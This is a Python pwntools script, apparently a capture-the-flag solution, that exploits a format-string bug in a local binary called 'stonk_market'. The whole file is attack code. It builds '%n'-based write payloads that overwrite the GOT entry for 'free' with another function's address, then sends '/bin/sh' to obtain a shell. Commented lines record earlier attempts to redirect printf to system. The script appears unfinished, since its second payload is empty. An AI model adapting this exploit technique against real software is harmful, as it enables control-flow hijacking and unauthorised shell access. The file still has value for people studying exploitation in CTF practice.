from pwn import *
e = ELF('./stonk_market')
r = process('./stonk_market')
context(arch='amd64', os='linux')
#gdb.attach(r, 'break buy_stonks')
#print({e.got['fflush']: e.symbols['buy_stonks']})
#print(p64(e.symbols['buy_stonks']), p64(e.plt['system']), p64(e.got['fflush']), p64(e.got['printf']))
#payload = fmtstr_payload(5, {e.got['fflush']: e.symbols['buy_stonks'], e.got['printf']: e.plt['system']})
# %12$n for main rbp writes
# which then writes to %20$n 
# %14$n writes to %55$n
def write_to(addr, val):
	payload = ''
	lower = val&0xffff 
	higher = val>>16
	#print(hex(lower), hex(higher))
	s = 0

	payload += f'%{addr}c%12$lln'
	s += addr 
	payload += f'%{2}c%14$lln'
	s += 2

	diff1 = (lower-s)%0xffff
	payload += f'%{diff1}c%20$hn' 
	s+=diff1 

	diff2 = (higher-s)%0xffff 
	payload += f'%{diff2}c%55$hn'
	s+=diff2

	return payload.encode()
# 1. write
# 2. get shell 
payload = write_to(e.got['free'], e.sym['buy_stonks'])
print('payload 1', payload)
r.sendline(b'1')
r.sendline(payload)
payload = f''.encode()
print('payload 2', payload)
r.sendline(b'/bin/sh')
#r.interactive()

